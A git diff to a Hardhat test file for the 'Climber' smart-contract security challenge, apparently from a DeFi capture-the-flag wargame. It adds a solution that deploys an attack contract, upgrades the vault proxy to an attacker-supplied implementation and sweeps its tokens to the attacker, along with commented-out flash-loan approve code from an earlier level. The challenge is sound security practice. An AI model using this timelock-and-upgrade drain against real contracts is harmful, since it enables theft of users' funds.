@@ -1,5 +1,6 @@
 const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
+const { AbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, attacker;
@@ -53,6 +54,22 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // 调用delay
+        // 增加升级合约提案
+        // 调用升级合约
+        // 调用sweepfunds
+        // const abi = ["function approve(address spender, uint256 amount)"];
+        // const iface = new ethers.utils.Interface(abi);
+        // const data = iface.encodeFunctionData("approve", [attacker.address, ethers.constants.MaxUint256]);
+        // await this.pool.connect(attacker).flashLoan(0,attacker.address,this.token.address,data);
+        
+        this.attackContract = await (await ethers.getContractFactory('AttackMain', attacker)).deploy(this.timelock.address,this.vault.address);
+        this.newvault = await ethers.getContractFactory('AttackClimberVault', attacker);
+        this.attackContract.connect(attacker).attack();
+        this.conmpromisedVault = await upgrades.upgradeProxy(this.vault.address,this.newvault
+        );
+        this.conmpromisedVault.connect(attacker).sweepFunds(this.token.address);
+
     });
 
     after(async function () {
